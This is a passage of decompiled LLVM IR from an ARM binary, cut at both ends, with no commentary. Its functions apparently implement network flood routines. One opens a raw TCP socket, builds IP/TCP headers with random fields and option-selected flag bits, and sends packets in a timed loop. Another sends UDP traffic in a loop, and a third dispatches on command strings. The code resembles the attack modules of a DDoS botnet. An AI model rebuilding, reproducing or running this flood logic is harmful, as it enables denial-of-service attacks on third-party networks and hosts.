  %v1_10318.lcssa = phi i32 [ %v3_10214, %dec_label_pc_10108 ], [ %v1_103183, %dec_label_pc_102f4 ]
  ret i32 %v1_10318.lcssa

; uselistorder directives
  uselistorder i32 %v1_102f8, { 1, 0 }
  uselistorder i32 %v4_10254, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v2_101f8, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v2_10148, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_15bf4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_102f4, { 1, 0 }
  uselistorder label %dec_label_pc_102d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10224, { 1, 0 }
}

define i32 @function_10320(i64* %arg1) local_unnamed_addr {
dec_label_pc_10320:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i64* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_10320 = load i1, i1* @cpsr_n, align 1
  br i1 %v0_10320, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_10320
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_10320, %bb
  call void @__pseudo_cond_branch(i1 %v0_10320, i32 -9875704)
  %v0_10328 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10328, label %bb7, label %.thread

bb7:                                              ; preds = %bb6
  %v1_10328 = load i32, i32* %r2.global-to-local, align 4
  %v2_10328 = inttoptr i32 %v1_10328 to i64*
  %v3_10328 = load i64, i64* %v2_10328, align 4
  %v4_10328 = load i32, i32* @r8, align 4
  %v6_10328 = udiv i64 %v3_10328, 4294967296
  %v9_10328 = sub i32 %v1_10328, %v4_10328
  %v3_1032c1 = udiv i64 %v3_10328, 1099511627776
  %v4_1032c3 = mul nuw nsw i64 %v6_10328, 16777216
  %v5_1032c5 = or i64 %v4_1032c3, %v3_1032c1
  %v5_1032c = trunc i64 %v5_1032c5 to i32
  %v8_1032c = and i32 %v5_1032c, %v9_10328
  store i32 %v8_1032c, i32* %r2.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb6, %bb7
  %v9_1032c = load i32, i32* @r0, align 4
  ret i32 %v9_1032c

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_10330(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10330:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 66364, i32* %stack_var_-4, align 4
  %v2_10338 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10338, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_1036c = icmp eq i32 %arg2, 0
  br i1 %v2_1036c, label %dec_label_pc_10374, label %dec_label_pc_1038c

dec_label_pc_10374:                               ; preds = %dec_label_pc_10330
  %v0_10374 = call i32 @function_83f0()
  br label %dec_label_pc_103a8

dec_label_pc_1038c:                               ; preds = %dec_label_pc_10330
  %v3_10394 = urem i32 %arg2, 65536
  %v1_1039c = call i32 @function_1464c(i32 %v3_10394)
  br label %dec_label_pc_103a8

dec_label_pc_103a8:                               ; preds = %dec_label_pc_10374, %dec_label_pc_1038c
  %v3_103b8 = call i32 @function_9b20(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_103c0 = icmp eq i32 %v3_103b8, 0
  br i1 %v2_103c0, label %dec_label_pc_103cc, label %dec_label_pc_109c4

dec_label_pc_103cc:                               ; preds = %dec_label_pc_103a8
  store i32 8, i32* @r2, align 4
  %v2_103e0 = bitcast i32* %stack_var_-60 to i8*
  %v3_103e0 = call i32 @function_13ed0(i8* %v2_103e0, i32 0)
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_103f0 = call i32 @function_14a84(i32 2, i32 3, i32 6)
  %v2_10400 = icmp eq i32 %v3_103f0, 0
  br i1 %v2_10400, label %dec_label_pc_109c4, label %dec_label_pc_1040c

dec_label_pc_1040c:                               ; preds = %dec_label_pc_103cc
  store i32 1, i32* %stack_var_-72, align 4
  %v2_10414 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_10430 = call i32 @function_14a40(i32 %v3_103f0, i32 0, i32 3, i32 %v2_10414, i32 4)
  %v1_10438 = icmp slt i32 %v5_10430, 0
  br i1 %v1_10438, label %dec_label_pc_109c4, label %dec_label_pc_10444

dec_label_pc_10444:                               ; preds = %dec_label_pc_1040c
  %v2_10448 = icmp eq i32 %arg7, 0
  br i1 %v2_10448, label %dec_label_pc_10474, label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_10444
  %v1_10460 = sub i32 32, %arg7
  store i32 %v1_10460, i32* %r2.global-to-local, align 4
  %v1_1046c = shl i32 -1, %v1_10460
  br label %dec_label_pc_10474

dec_label_pc_10474:                               ; preds = %dec_label_pc_10444, %dec_label_pc_1045c
  %storemerge9 = phi i32 [ %v1_1046c, %dec_label_pc_1045c ], [ 0, %dec_label_pc_10444 ]
  %v3_10474 = load i32, i32* %stack_var_0, align 4
  %v1_10478 = add i32 %v3_10474, 40
  %v1_10488 = add i32 %v3_10474, 54
  %v3_1048c = and i32 %v1_10488, -8
  %v1_10494 = load i32, i32* @sp, align 4
  %v2_10494 = sub i32 %v1_10494, %v3_1048c
  %v1_104a4 = add i32 %v2_10494, 15
  %v3_104a8 = and i32 %v1_104a4, -8
  store i32 %v3_104a8, i32* %r2.global-to-local, align 4
  %v1_104c8 = add i32 %v3_104a8, 20
  %v5_104cc = inttoptr i32 %v1_104c8 to i16*
  %v3_104d0 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_104d0, i32* @r4, align 4
  %v1_104d8 = call i32 @function_e57c(i32 %storemerge9)
  %v1_104e4 = call i32 @function_1465c(i32 %v1_104d8)
  store i32 %v1_104e4, i32* %r2.global-to-local, align 4
  %v3_104ec = load i32, i32* %stack_var_0, align 4
  %v1_104f0 = add i32 %v3_104ec, 20
  %v1_104f4 = load i32, i32* @sp, align 4
  %v2_104f4 = inttoptr i32 %v1_104f4 to i32*
  store i32 %v1_104f0, i32* %v2_104f4, align 4
  %v0_104fc = load i32, i32* @r4, align 4
  %v4_10504 = inttoptr i32 %v3_104a8 to i8*
  %v5_10504 = call i32 @function_e808(i8* %v4_10504, i32 %v0_104fc, i32 %v1_104e4, i32 6)
  %v0_10508 = call i32 @function_83f0()
  %v3_10514 = urem i32 %v0_10508, 65536
  store i32 %v3_10514, i32* %r2.global-to-local, align 4
  %v1_1051c = trunc i32 %v0_10508 to i16
  store i16 %v1_1051c, i16* %v5_104cc, align 4
  %v0_10520 = call i32 @function_83f0()
  %v2_1052c = add i32 %v3_104a8, 24
  %v3_1052c = inttoptr i32 %v2_1052c to i32*
  store i32 %v0_10520, i32* %v3_1052c, align 8
  %v2_10538 = add i32 %v3_104a8, 28
  %v3_10538 = inttoptr i32 %v2_10538 to i32*
  store i32 0, i32* %v3_10538, align 4
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v1_10540 = add i32 %v3_104a8, 32
  %v2_10540 = inttoptr i32 %v1_10540 to i8*
  %v3_10540 = load i8, i8* %v2_10540, align 8
  %v1_1054c = urem i8 %v3_10540, 16
  %v1_10550 = or i8 %v1_1054c, 80
  store i8 %v1_10550, i8* %v2_10540, align 8
  store i32 ptrtoint ([4 x i8]* @global_var_224ac.586 to i32), i32* @r1, align 4
  %v3_1056c = inttoptr i32 %arg4 to i8*
  %v4_1056c = call i32 @function_13fe0(i8* %v3_1056c, i32 ptrtoint ([4 x i8]* @global_var_224ac.586 to i32))
  %v2_10574 = icmp eq i32 %v4_1056c, 0
  br i1 %v2_10574, label %dec_label_pc_1057c, label %dec_label_pc_10634

dec_label_pc_1057c:                               ; preds = %dec_label_pc_10474
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v1_10580 = add i32 %v3_104a8, 33
  %v2_10580 = inttoptr i32 %v1_10580 to i8*
  %v3_10580 = load i8, i8* %v2_10580, align 1
  %v1_10590 = or i8 %v3_10580, 2
  store i8 %v1_10590, i8* %v2_10580, align 1
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v3_105a4 = load i8, i8* %v2_10580, align 1
  %v1_105b4 = or i8 %v3_105a4, 4
  store i8 %v1_105b4, i8* %v2_10580, align 1
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v3_105c8 = load i8, i8* %v2_10580, align 1
  %v1_105d8 = or i8 %v3_105c8, 1
  store i8 %v1_105d8, i8* %v2_10580, align 1
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v3_105ec = load i8, i8* %v2_10580, align 1
  %v1_105fc = or i8 %v3_105ec, 16
  store i8 %v1_105fc, i8* %v2_10580, align 1
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v3_10610 = load i8, i8* %v2_10580, align 1
  %v1_10620 = or i8 %v3_10610, 8
  store i8 %v1_10620, i8* %v2_10580, align 1
  br label %dec_label_pc_107c0

dec_label_pc_10634:                               ; preds = %dec_label_pc_10474
  %v2_10640 = call i32 @function_143f8(i32 %arg4, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  %v2_107b818 = icmp eq i32 %v2_10640, 0
  br i1 %v2_107b818, label %dec_label_pc_107c0, label %dec_label_pc_10650.lr.ph

dec_label_pc_10650.lr.ph:                         ; preds = %dec_label_pc_10634
  %v1_10670 = add i32 %v3_104a8, 33
  %v2_10670 = inttoptr i32 %v1_10670 to i8*
  br label %dec_label_pc_10650

dec_label_pc_10650:                               ; preds = %dec_label_pc_10650.lr.ph, %dec_label_pc_107a0
  %storemerge1319 = phi i32 [ %v2_10640, %dec_label_pc_10650.lr.ph ], [ %v2_107a8, %dec_label_pc_107a0 ]
  store i32 ptrtoint ([4 x i8]* @global_var_224b4.590 to i32), i32* @r1, align 4
  %v3_1065c = inttoptr i32 %storemerge1319 to i8*
  %v4_1065c = call i32 @function_13fe0(i8* %v3_1065c, i32 ptrtoint ([4 x i8]* @global_var_224b4.590 to i32))
  %v2_10664 = icmp eq i32 %v4_1065c, 0
  br i1 %v2_10664, label %dec_label_pc_1066c, label %dec_label_pc_10694

dec_label_pc_1066c:                               ; preds = %dec_label_pc_10650
  %v3_10670 = load i8, i8* %v2_10670, align 1
  %v4_10678 = zext i8 %v3_10670 to i32
  %v1_10680 = or i32 %v4_10678, 2
  store i32 %v1_10680, i32* %r2.global-to-local, align 4
  %v1_1068c = trunc i32 %v1_10680 to i8
  store i8 %v1_1068c, i8* %v2_10670, align 1
  br label %dec_label_pc_107a0

dec_label_pc_10694:                               ; preds = %dec_label_pc_10650
  store i32 ptrtoint ([4 x i8]* @global_var_224b8.592 to i32), i32* @r1, align 4
  %v4_106a0 = call i32 @function_13fe0(i8* %v3_1065c, i32 ptrtoint ([4 x i8]* @global_var_224b8.592 to i32))
  %v2_106a8 = icmp eq i32 %v4_106a0, 0
  br i1 %v2_106a8, label %dec_label_pc_106b0, label %dec_label_pc_106d8

dec_label_pc_106b0:                               ; preds = %dec_label_pc_10694
  %v3_106b4 = load i8, i8* %v2_10670, align 1
  %v4_106bc = zext i8 %v3_106b4 to i32
  %v1_106c4 = or i32 %v4_106bc, 4
  store i32 %v1_106c4, i32* %r2.global-to-local, align 4
  %v1_106d0 = trunc i32 %v1_106c4 to i8
  store i8 %v1_106d0, i8* %v2_10670, align 1
  br label %dec_label_pc_107a0

dec_label_pc_106d8:                               ; preds = %dec_label_pc_10694
  store i32 ptrtoint ([4 x i8]* @global_var_224bc.594 to i32), i32* @r1, align 4
  %v4_106e4 = call i32 @function_13fe0(i8* %v3_1065c, i32 ptrtoint ([4 x i8]* @global_var_224bc.594 to i32))
  %v2_106ec = icmp eq i32 %v4_106e4, 0
  br i1 %v2_106ec, label %dec_label_pc_106f4, label %dec_label_pc_1071c

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106d8
  %v3_106f8 = load i8, i8* %v2_10670, align 1
  %v4_10700 = zext i8 %v3_106f8 to i32
  %v1_10708 = or i32 %v4_10700, 1
  store i32 %v1_10708, i32* %r2.global-to-local, align 4
  %v1_10714 = trunc i32 %v1_10708 to i8
  store i8 %v1_10714, i8* %v2_10670, align 1
  br label %dec_label_pc_107a0

dec_label_pc_1071c:                               ; preds = %dec_label_pc_106d8
  store i32 ptrtoint ([4 x i8]* @global_var_224c0.596 to i32), i32* @r1, align 4
  %v4_10728 = call i32 @function_13fe0(i8* %v3_1065c, i32 ptrtoint ([4 x i8]* @global_var_224c0.596 to i32))
  %v2_10730 = icmp eq i32 %v4_10728, 0
  br i1 %v2_10730, label %dec_label_pc_10738, label %dec_label_pc_10760

dec_label_pc_10738:                               ; preds = %dec_label_pc_1071c
  %v3_1073c = load i8, i8* %v2_10670, align 1
  %v4_10744 = zext i8 %v3_1073c to i32
  %v1_1074c = or i32 %v4_10744, 16
  store i32 %v1_1074c, i32* %r2.global-to-local, align 4
  %v1_10758 = trunc i32 %v1_1074c to i8
  store i8 %v1_10758, i8* %v2_10670, align 1
  br label %dec_label_pc_107a0

dec_label_pc_10760:                               ; preds = %dec_label_pc_1071c
  store i32 ptrtoint ([4 x i8]* @global_var_224c4.598 to i32), i32* @r1, align 4
  %v4_1076c = call i32 @function_13fe0(i8* %v3_1065c, i32 ptrtoint ([4 x i8]* @global_var_224c4.598 to i32))
  %v2_10774 = icmp eq i32 %v4_1076c, 0
  br i1 %v2_10774, label %dec_label_pc_1077c, label %dec_label_pc_107a0

dec_label_pc_1077c:                               ; preds = %dec_label_pc_10760
  %v3_10780 = load i8, i8* %v2_10670, align 1
  %v4_10788 = zext i8 %v3_10780 to i32
  %v1_10790 = or i32 %v4_10788, 8
  store i32 %v1_10790, i32* %r2.global-to-local, align 4
  %v1_1079c = trunc i32 %v1_10790 to i8
  store i8 %v1_1079c, i8* %v2_10670, align 1
  br label %dec_label_pc_107a0

dec_label_pc_107a0:                               ; preds = %dec_label_pc_10760, %dec_label_pc_10738, %dec_label_pc_106f4, %dec_label_pc_106b0, %dec_label_pc_1066c, %dec_label_pc_1077c
  %v2_107a8 = call i32 @function_143f8(i32 0, i32 ptrtoint (i32* @global_var_224b0.588 to i32))
  %v2_107b8 = icmp eq i32 %v2_107a8, 0
  br i1 %v2_107b8, label %dec_label_pc_107c0, label %dec_label_pc_10650

dec_label_pc_107c0:                               ; preds = %dec_label_pc_107a0, %dec_label_pc_10634, %dec_label_pc_1057c
  %v0_107c0 = call i32 @function_83f0()
  %v1_107d4 = trunc i32 %v0_107c0 to i16
  %v3_107d4 = add i32 %v3_104a8, 34
  %v4_107d4 = inttoptr i32 %v3_107d4 to i16*
  store i16 %v1_107d4, i16* %v4_107d4, align 2
  %v3_107e0 = add i32 %v3_104a8, 36
  %v4_107e0 = inttoptr i32 %v3_107e0 to i16*
  store i16 0, i16* %v4_107e0, align 4
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  %v3_107ec = add i32 %v3_104a8, 38
  %v4_107ec = inttoptr i32 %v3_107ec to i16*
  store i16 0, i16* %v4_107ec, align 2
  br i1 %v2_1036c, label %dec_label_pc_107fc, label %dec_label_pc_10814

dec_label_pc_107fc:                               ; preds = %dec_label_pc_107c0
  %v0_107fc = call i32 @function_83f0()
  %extract.t = trunc i32 %v0_107fc to i16
  br label %dec_label_pc_10830

dec_label_pc_10814:                               ; preds = %dec_label_pc_107c0
  %v3_1081c = urem i32 %arg2, 65536
  %v1_10824 = call i32 @function_1464c(i32 %v3_1081c)
  %extract.t72 = trunc i32 %v1_10824 to i16
  br label %dec_label_pc_10830

dec_label_pc_10830:                               ; preds = %dec_label_pc_107fc, %dec_label_pc_10814
  %v0_107fc.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_107fc ], [ %extract.t72, %dec_label_pc_10814 ]
  %v3_10838 = add i32 %v3_104a8, 22
  %v4_10838 = inttoptr i32 %v3_10838 to i16*
  store i16 %v0_107fc.sink.off0, i16* %v4_10838, align 2
  %v2_10844 = call i32 @function_e734(i32 %v3_104a8, i32 %v1_104c8)
  %v1_10854 = trunc i32 %v2_10844 to i16
  store i16 %v1_10854, i16* %v4_107e0, align 4
  store i32 %v3_104a8, i32* %r2.global-to-local, align 4
  %v1_10864 = or i32 %v3_104a8, 2
  %v2_10864 = inttoptr i32 %v1_10864 to i16*
  %v3_10864 = load i16, i16* %v2_10864, align 2
  %v4_10864 = zext i16 %v3_10864 to i32
  %v2_10870 = inttoptr i32 %v3_104a8 to i16*
  %v3_10870 = call i32 @function_e5e0(i16* %v2_10870, i32 %v4_10864)
  %sext3 = mul i32 %v3_10870, 65536
  %v1_10874 = sdiv i32 %sext3, 65536
  store i32 %v1_10874, i32* %r2.global-to-local, align 4
  %v1_10880 = trunc i32 %v1_10874 to i16
  %v3_10880 = add i32 %v3_104a8, 10
  %v4_10880 = inttoptr i32 %v3_10880 to i16*
  store i16 %v1_10880, i16* %v4_10880, align 2
  %v2_10888 = call i32 @function_1265c(i32* null)
  %v2_10894 = add i32 %v2_10888, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_108a8 = ptrtoint i32* %stack_var_-68 to i32
  %v2_108e8 = add i32 %v3_104a8, 12
  %v3_108e8 = inttoptr i32 %v2_108e8 to i32*
  %v3_10900 = or i32 %v3_104a8, 4
  %v4_10900 = inttoptr i32 %v3_10900 to i16*
  br label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_109b4, %dec_label_pc_109a8, %dec_label_pc_10830
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_10830 ], [ 0, %dec_label_pc_109a8 ], [ %v1_109b8, %dec_label_pc_109b4 ]
  store i32 %v3_104a8, i32* %r2.global-to-local, align 4
  %v1_108ac = load i32, i32* @sp, align 4
  %v2_108ac = inttoptr i32 %v1_108ac to i32*
  store i32 %v2_108a8, i32* %v2_108ac, align 4
  %v1_108b4 = load i32, i32* @sp, align 4
  %v2_108b4 = add i32 %v1_108b4, 4
  %v3_108b4 = inttoptr i32 %v2_108b4 to i32*
  store i32 16, i32* %v3_108b4, align 4
  %v0_108bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10478, i32* %r2.global-to-local, align 4
  %v4_108c8 = call i32 @function_14a00(i32 %v3_103f0, i32 %v0_108bc, i32 %v1_10478, i32 0)
  %v1_108d0 = call i32 @function_e57c(i32 %storemerge9)
  %v1_108dc = call i32 @function_1465c(i32 %v1_108d0)
  store i32 %v1_108dc, i32* %r2.global-to-local, align 4
  store i32 %v1_108dc, i32* %v3_108e8, align 4
  %v0_108ec = call i32 @function_83f0()
  %v3_108f8 = urem i32 %v0_108ec, 65536
  store i32 %v3_108f8, i32* %r2.global-to-local, align 4
  %v1_10900 = trunc i32 %v0_108ec to i16
  store i16 %v1_10900, i16* %v4_10900, align 4
  %v0_10904 = call i32 @function_83f0()
  store i32 %v0_10904, i32* %r2.global-to-local, align 4
  store i32 %v0_10904, i32* %v3_1052c, align 8
  %v0_10914 = call i32 @function_83f0()
  %v1_10928 = trunc i32 %v0_10914 to i16
  store i16 %v1_10928, i16* %v5_104cc, align 4
  store i32 %v1_104c8, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_107e0, align 4
  %v4_10940 = call i32 @function_e734(i32 %v3_104a8, i32 %v1_104c8)
  %v1_10950 = trunc i32 %v4_10940 to i16
  store i16 %v1_10950, i16* %v4_107e0, align 4
  store i32 %v3_104a8, i32* %r2.global-to-local, align 4
  %v3_10960 = load i16, i16* %v2_10864, align 2
  %v4_10960 = zext i16 %v3_10960 to i32
  %v3_1096c = call i32 @function_e5e0(i16* %v2_10870, i32 %v4_10960)
  %sext5 = mul i32 %v3_1096c, 65536
  %v1_10970 = sdiv i32 %sext5, 65536
  store i32 %v1_10970, i32* %r2.global-to-local, align 4
  %v1_1097c = trunc i32 %v1_10970 to i16
  store i16 %v1_1097c, i16* %v4_10880, align 2
  %v9_10988 = icmp eq i32 %stack_var_-92.0, %arg6
  br i1 %v9_10988, label %dec_label_pc_10990, label %dec_label_pc_109b4

dec_label_pc_10990:                               ; preds = %dec_label_pc_108a4
  %v2_10994 = call i32 @function_1265c(i32* null)
  store i32 %v2_10994, i32* %r2.global-to-local, align 4
  %v8_109a4 = icmp sgt i32 %v2_10994, %v2_10894
  br i1 %v8_109a4, label %dec_label_pc_109c4, label %dec_label_pc_109a8

dec_label_pc_109a8:                               ; preds = %dec_label_pc_10990
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_108a4

dec_label_pc_109b4:                               ; preds = %dec_label_pc_108a4
  %v1_109b8 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_108a4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_10990, %dec_label_pc_1040c, %dec_label_pc_103cc, %dec_label_pc_103a8
  %v1_109d0 = phi i32 [ %v5_10430, %dec_label_pc_1040c ], [ 0, %dec_label_pc_103cc ], [ %v3_103b8, %dec_label_pc_103a8 ], [ %v2_10994, %dec_label_pc_10990 ]
  ret i32 %v1_109d0

; uselistorder directives
  uselistorder i32 %v1_10970, { 1, 0 }
  uselistorder i32 %v0_108ec, { 1, 0 }
  uselistorder i32 %v1_10874, { 1, 0 }
  uselistorder i8* %v2_10670, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_10580, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_10508, { 1, 0 }
  uselistorder i32 %v1_104c8, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_104a8, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_10478, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 (i32, i32)* @function_e734, { 1, 0 }
  uselistorder i32 (i32)* @function_1465c, { 1, 0 }
  uselistorder i32 (i32)* @function_e57c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_14a40, { 1, 0 }
  uselistorder i32 ()* @function_83f0, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder label %dec_label_pc_10830, { 1, 0 }
  uselistorder label %dec_label_pc_107a0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10650, { 1, 0 }
  uselistorder label %dec_label_pc_10474, { 1, 0 }
  uselistorder label %dec_label_pc_103a8, { 1, 0 }
}

define i32 @function_109f0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_109f0:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 68092, i32* %stack_var_-4, align 4
  %v2_109f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_109f8, i32* @fp, align 4
  %v3_10a18 = call i32 @function_14a84(i32 2, i32 2, i32 0)
  %v2_10a28 = call i32 @function_1265c(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_10a3c = call i32 @function_14858(i32 %arg1)
  %v2_10a48 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10a48, i32* @r0, align 4
  %v2_10a54 = call i32 @function_14010(i32 %v2_10a48, i32 16)
  %v1_10a5c = add i32 %v1_10a3c, 16
  %v2_10a5c = inttoptr i32 %v1_10a5c to i32*
  %v3_10a5c = load i32, i32* %v2_10a5c, align 4
  %v1_10a60 = inttoptr i32 %v3_10a5c to i32*
  %v2_10a60 = load i32, i32* %v1_10a60, align 4
  %v1_10a68 = add i32 %v1_10a3c, 12
  %v2_10a68 = inttoptr i32 %v1_10a68 to i32*
  %v3_10a68 = load i32, i32* %v2_10a68, align 4
  store i32 %v3_10a68, i32* @r2, align 4
  %v2_10a74 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_10a74, i32* @r3, align 4
  %v5_10a80 = call i32 @function_13fd0(i32 %v2_10a60, i32 %v2_10a74, i32 %v3_10a68, i32 %v2_10a74, i32 ptrtoint (i32* @0 to i32))
  %v1_10a88 = add i32 %v1_10a3c, 8
  %v2_10a88 = inttoptr i32 %v1_10a88 to i32*
  %v3_10a88 = load i32, i32* %v2_10a88, align 4
  %v3_10a90 = urem i32 %v3_10a88, 65536
  store i32 %v3_10a90, i32* %stack_var_-48, align 4
  %v2_10af8 = add i32 %v2_10a28, %arg3
  br label %dec_label_pc_10ab0

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10b1c, %dec_label_pc_109f0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_109f0 ], [ %v1_10b20, %dec_label_pc_10b1c ]
  %tmp = icmp ult i32 %storemerge1, 50
  br i1 %tmp, label %dec_label_pc_10b1c, label %dec_label_pc_10abc

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10ab0
  %v5_10acc = call i32 @function_149c8(i32 %v3_10a18, i32 ptrtoint ([4 x i8]* @global_var_224c8.600 to i32), i32 69, i32 0)
  %v3_10ae0 = call i32 @function_148dc(i32 %v3_10a18, i32 %v2_10a48, i32 16)
  %v2_10ae8 = call i32 @function_1265c(i32* null)
  %v5_10b00 = icmp slt i32 %v2_10ae8, %v2_10af8
  br i1 %v5_10b00, label %dec_label_pc_10b14, label %dec_label_pc_10b04

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10abc
  %v1_10b08 = call i32 @function_12a98(i32 %v3_10a18)
  %v1_10b10 = call i32 @function_12a34(i32 0)
  br label %dec_label_pc_10b14

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10abc, %dec_label_pc_10b04
  br label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10ab0, %dec_label_pc_10b14
  %stack_var_-20.0 = phi i32 [ %storemerge1, %dec_label_pc_10ab0 ], [ 0, %dec_label_pc_10b14 ]
  %v1_10b20 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10ab0

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v2_10a48, { 0, 2, 1 }
  uselistorder i32 %v1_10a3c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_13fd0, { 1, 0 }
  uselistorder i32 (i32)* @function_14858, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10b14, { 1, 0 }
}

define i32 @function_10b30(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10b30:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_10b34 = load i32, i32* @r4, align 4
  %v6_10b34 = load i32, i32* @r5, align 4
  %v9_10b34 = load i32, i32* @r6, align 4
  %v12_10b34 = load i32, i32* @r7, align 4
  %v15_10b34 = load i32, i32* @r8, align 4
  %v18_10b34 = load i32, i32* @fp, align 4
  store i32 68412, i32* %stack_var_-4, align 4
  %v2_10b38 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10b38, i32* @fp, align 4
  %v2_10b4c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_21308.38 to i32), i32* @r1, align 4
  %v3_10b58 = inttoptr i32 %v2_10b4c to i8*
  %v4_10b58 = call i32 @function_13fe0(i8* %v3_10b58, i32 ptrtoint ([5 x i8]* @global_var_21308.38 to i32))
  %v2_10b60 = icmp eq i32 %v4_10b58, 0
  br i1 %v2_10b60, label %dec_label_pc_10b68, label %dec_label_pc_10b80

dec_label_pc_10b68:                               ; preds = %dec_label_pc_10b30
  %v2_10b6c = load i32, i32* @global_var_2c890.36, align 4
  %v3_10b78 = call i32 @function_9340(i32 %v2_10b6c, i32 ptrtoint ([6 x i8]* @global_var_224cc.604 to i32))
  br label %dec_label_pc_11430

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b30
  %v2_10b84 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_224d4.606 to i32), i32* @r1, align 4
  %v3_10b90 = inttoptr i32 %v2_10b84 to i8*
  %v4_10b90 = call i32 @function_13fe0(i8* %v3_10b90, i32 ptrtoint ([7 x i8]* @global_var_224d4.606 to i32))
  %v2_10b98 = icmp eq i32 %v4_10b90, 0
  br i1 %v2_10b98, label %dec_label_pc_10ba0, label %dec_label_pc_10cb4

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b80
